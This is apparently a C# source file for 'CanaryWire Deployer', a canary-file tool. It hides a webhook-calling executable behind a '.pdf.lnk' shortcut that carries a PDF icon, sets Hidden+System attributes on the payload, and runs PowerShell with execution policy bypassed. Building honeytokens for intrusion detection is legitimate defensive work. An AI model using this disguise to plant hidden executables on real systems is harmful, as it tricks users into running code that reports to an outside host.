using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;

namespace CanaryWire.CLI
{
    class Program
    {
        static void Main(string[] args)
        {
          try
          {
            Console.WriteLine("=== CanaryWire Deployer ===");
            Console.WriteLine();
            
            // 1. Locate the base payload
            string? basePayloadPath = FindPayload();

            if (basePayloadPath == null)
            {
                Console.WriteLine("[!] Error: Could not find base payload 'CanaryWire.Canary.exe' (single file).");
                Console.WriteLine("    Please run: dotnet publish CanaryWire.Canary -c Release -r win-x64 --self-contained false -p:PublishSingleFile=true");
                Console.WriteLine("\nPress any key to exit...");
                Console.ReadKey();
                return;
            }
            Console.WriteLine("[*] Found payload template: " + basePayloadPath);

            // 2. Locate icon source (PNG preferred for proper ICO generation)
            string? iconSourcePath = FindIconSource();
            if (iconSourcePath != null)
                Console.WriteLine("[*] Found icon source: " + iconSourcePath);

            // 3. Get Webhook
            Console.Write("\nEnter Discord Webhook URL: ");
            string? webhookUrl = Console.ReadLine()?.Trim();
            if (string.IsNullOrEmpty(webhookUrl) || !webhookUrl.StartsWith("http"))
            {
                Console.WriteLine("[!] Invalid Webhook URL.");
                return;
            }

            // 4. Get Output Name (just a base name, no extension needed)
            Console.Write("Enter canary name (e.g. 'passwords', 'confidential'): ");
            string? baseName = Console.ReadLine()?.Trim();
            if (string.IsNullOrEmpty(baseName)) baseName = "document";
            baseName = Path.GetFileNameWithoutExtension(baseName);

            // 5. Get output directory (must be a full path starting from drive root)
            Console.Write("Enter output directory (full path, e.g. 'C:\\Users\\you\\Desktop'): ");
            string? outputDir = Console.ReadLine()?.Trim();

            if (string.IsNullOrEmpty(outputDir))
            {
                Console.WriteLine("[!] No directory provided.");
                return;
            }

            if (!Path.IsPathFullyQualified(outputDir))
            {
                Console.WriteLine("[!] Invalid path. Must be a full path starting from the drive root (e.g. C:\\...).");
                return;
            }

            if (!Directory.Exists(outputDir))
            {
                try
                {
                    Directory.CreateDirectory(outputDir);
                    Console.WriteLine("[*] Created directory: " + outputDir);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] Failed to create directory: " + ex.Message);
                    return;
                }
            }

            // Verify write access
            try
            {
                string testFile = Path.Combine(outputDir, ".cw_write_test");
                File.WriteAllText(testFile, "");
                File.Delete(testFile);
            }
            catch
            {
                Console.WriteLine("[!] Cannot write to that directory. Check permissions.");
                return;
            }

            // 6. Deploy canary using Windows Shortcut (.lnk) method
            string randomId = Guid.NewGuid().ToString("N").Substring(0, 8);

            // Hidden payload uses .exe extension — Windows must see .exe to execute it
            // and to extract the embedded icon. Hidden+System makes it invisible in Explorer.
            string hiddenExeName = "~$" + randomId + ".exe";
            string hiddenIcoName = "~$" + randomId + ".ico";
            string hiddenExePath = Path.GetFullPath(Path.Combine(outputDir, hiddenExeName));
            string hiddenIcoPath = Path.GetFullPath(Path.Combine(outputDir, hiddenIcoName));
            string shortcutPath = Path.GetFullPath(Path.Combine(outputDir, baseName + ".pdf.lnk"));

            if (File.Exists(shortcutPath))
            {
                Console.WriteLine("[!] A file named \"" + baseName + ".pdf\" already exists in that directory.");
                Console.Write("    Overwrite? (y/n): ");
                string? confirm = Console.ReadLine()?.Trim().ToLower();
                if (confirm != "y" && confirm != "yes")
                {
                    Console.WriteLine("[*] Cancelled.");
                    return;
                }
            }

            try 
            {
                // 6a. Copy payload and embed webhook URL
                File.Copy(basePayloadPath, hiddenExePath, true);
                
                using (var fs = new FileStream(hiddenExePath, FileMode.Append, FileAccess.Write))
                {
                    byte[] urlBytes = Encoding.UTF8.GetBytes(webhookUrl);
                    byte[] lengthBytes = BitConverter.GetBytes(urlBytes.Length);
                    fs.Write(urlBytes, 0, urlBytes.Length);

                    fs.Write(lengthBytes, 0, lengthBytes.Length);
                }

                // 6b. Set hidden + system attributes (invisible in Explorer)
                File.SetAttributes(hiddenExePath, FileAttributes.Hidden | FileAttributes.System);

                // 6c. Generate proper ICO and deploy as hidden file
                string iconLocationValue = hiddenExePath + ",0";
                if (iconSourcePath != null)
                {
                    bool icoCreated = false;
                    if (iconSourcePath.EndsWith(".png", StringComparison.OrdinalIgnoreCase))
                    {
                        icoCreated = GenerateIcoFromPng(iconSourcePath, hiddenIcoPath);
                    }
                    else if (iconSourcePath.EndsWith(".ico", StringComparison.OrdinalIgnoreCase))
                    {
                        File.Copy(iconSourcePath, hiddenIcoPath, true);
                        icoCreated = true;
                    }

                    if (icoCreated && File.Exists(hiddenIcoPath))
                    {
                        File.SetAttributes(hiddenIcoPath, FileAttributes.Hidden | FileAttributes.System);
                        iconLocationValue = hiddenIcoPath + ",0";
                    }
                }

                // 6d. Create .lnk shortcut via PowerShell script file
                // Writing a .ps1 file avoids all escaping issues:
                //   - PowerShell $variables in script are not C# interpolated
                //   - Single-quoted paths prevent PS from interpreting $ in filenames
                string tempPs1 = Path.Combine(Path.GetTempPath(), "cw_" + randomId + ".ps1");

                string ps1Content =
                    "$wsh = New-Object -ComObject WScript.Shell" + Environment.NewLine +
                    "$lnk = $wsh.CreateShortcut('" + shortcutPath.Replace("'", "''") + "')" + Environment.NewLine +
                    "$lnk.TargetPath = '" + hiddenExePath.Replace("'", "''") + "'" + Environment.NewLine +
                    "$lnk.IconLocation = '" + iconLocationValue.Replace("'", "''") + "'" + Environment.NewLine +
                    "$lnk.Save()" + Environment.NewLine;

                File.WriteAllText(tempPs1, ps1Content, Encoding.UTF8);

                var psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = "-NoProfile -ExecutionPolicy Bypass -File \"" + tempPs1 + "\"",
                    CreateNoWindow = true,
                    UseShellExecute = false
                };

                var proc = Process.Start(psi);
                proc?.WaitForExit(15000);

                try { File.Delete(tempPs1); } catch { }

                if (!File.Exists(shortcutPath))
                {
                    Console.WriteLine("[!] Error: Failed to create shortcut.");
                    return;
                }

                Console.WriteLine();
                Console.WriteLine("[+] Canary deployed successfully!");
                Console.WriteLine();
                Console.WriteLine("    Shortcut : " + shortcutPath);
                Console.WriteLine("               Displayed as \"" + baseName + ".pdf\" (.lnk is always hidden)");
                Console.WriteLine("    Payload  : " + hiddenExePath);
                Console.WriteLine("               Hidden + System (invisible in Explorer)");
                if (File.Exists(hiddenIcoPath))
                {
                    Console.WriteLine("    Icon     : " + hiddenIcoPath);
                    Console.WriteLine("               Hidden + System (invisible in Explorer)");
                }
                Console.WriteLine();
                Console.WriteLine("[!] Deploy ALL generated files together to the target location.");
                Console.WriteLine("    Only the .pdf shortcut is visible to the target user.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Error: " + ex.Message);
            }
            
          }
          catch (Exception ex)
          {
            Console.WriteLine("[!] Fatal error: " + ex.Message);
          }
          finally
          {
            Console.WriteLine("\nPress any key to exit...");
            Console.ReadKey();
          }
        }

        /// <summary>
        /// Creates a valid Windows ICO file by wrapping raw PNG data in an ICO container.
        /// Uses the PNG-in-ICO format supported by Windows Vista+.
        /// This bypasses the .NET Icon.Save() bug that produces non-standard ICO files.
        /// </summary>
        static bool GenerateIcoFromPng(string pngPath, string icoPath)
        {
            try
            {
                byte[] pngData = File.ReadAllBytes(pngPath);
                if (pngData.Length < 24) return false;

                // Read dimensions from the PNG IHDR chunk (bytes 16-23)
                int width = (pngData[16] << 24) | (pngData[17] << 16) | (pngData[18] << 8) | pngData[19];
                int height = (pngData[20] << 24) | (pngData[21] << 16) | (pngData[22] << 8) | pngData[23];

                using (var fs = new FileStream(icoPath, FileMode.Create, FileAccess.Write))
                using (var w = new BinaryWriter(fs))
                {
                    // ICO Header (6 bytes)
                    w.Write((ushort)0);          // Reserved
                    w.Write((ushort)1);          // Type: 1 = ICO
                    w.Write((ushort)1);          // Image count: 1

                    // Directory Entry (16 bytes)
                    w.Write((byte)(width >= 256 ? 0 : width));   // Width (0 = 256)
                    w.Write((byte)(height >= 256 ? 0 : height)); // Height (0 = 256)
                    w.Write((byte)0);            // Color palette count
                    w.Write((byte)0);            // Reserved
                    w.Write((ushort)1);          // Color planes
                    w.Write((ushort)32);         // Bits per pixel
                    w.Write((uint)pngData.Length); // Image data size
                    w.Write((uint)22);           // Offset to image data (6 + 16 = 22)

                    // Image Data (raw PNG bytes)
                    w.Write(pngData);
                }

                return true;
            }
            catch
            {
                return false;
            }
        }

        static string? FindIconSource()
        {
            string? solutionRoot = FindSolutionRoot(Directory.GetCurrentDirectory());
            if (solutionRoot != null)
            {
                // Prefer PNG source for proper ICO generation
                string rootPng = Path.Combine(solutionRoot, "image.png");
                if (File.Exists(rootPng)) return rootPng;

                string canaryIco = Path.Combine(solutionRoot, "CanaryWire.Canary", "app.ico");
                if (File.Exists(canaryIco)) return canaryIco;

                string rootIco = Path.Combine(solutionRoot, "image.ico");
                if (File.Exists(rootIco)) return rootIco;
            }

            if (File.Exists("image.png")) return Path.GetFullPath("image.png");
            if (File.Exists("app.ico")) return Path.GetFullPath("app.ico");
            if (File.Exists("image.ico")) return Path.GetFullPath("image.ico");

            // Fallback: extract embedded icon resource to a temp file
            string? extracted = ExtractEmbeddedIcon();
            if (extracted != null) return extracted;

            return null;
        }

        static string? ExtractEmbeddedIcon()
        {
            try
            {
                var assembly = System.Reflection.Assembly.GetExecutingAssembly();
                using var stream = assembly.GetManifestResourceStream("CanaryWire.CLI.app.ico");
                if (stream == null) return null;

                string tempIco = Path.Combine(Path.GetTempPath(), "cw_embedded_icon.ico");
                using (var fs = new FileStream(tempIco, FileMode.Create, FileAccess.Write))
                {
                    stream.CopyTo(fs);
                }
                return tempIco;
            }
            catch
            {
                return null;
            }
        }

        static string? FindPayload()
        {
            if (File.Exists("CanaryWire.Canary.exe")) return "CanaryWire.Canary.exe";

            string? solutionRoot = FindSolutionRoot(Directory.GetCurrentDirectory());
            
            if (solutionRoot != null)
            {
                string publishPath = Path.Combine(solutionRoot, "CanaryWire.Canary", "bin", "Release", "net10.0-windows", "win-x64", "publish", "CanaryWire.Canary.exe");
                if (File.Exists(publishPath)) return publishPath;
                
                string debugPath = Path.Combine(solutionRoot, "CanaryWire.Canary", "bin", "Debug", "net10.0-windows", "CanaryWire.Canary.exe");
                if (File.Exists(debugPath)) return debugPath;
            }

            return null;
        }

        static string? FindSolutionRoot(string startDir)
        {
            try
            {
                DirectoryInfo? dir = new DirectoryInfo(startDir);
                while (dir != null)
                {
                    try
                    {
                        if (dir.GetFiles("*.sln").Length > 0 || dir.GetFiles("*.slnx").Length > 0)
                        {
                            return dir.FullName;
                        }
                    }
                    catch { }
                    dir = dir.Parent;
                }
            }
            catch { }
            return null;
        }
    }
}
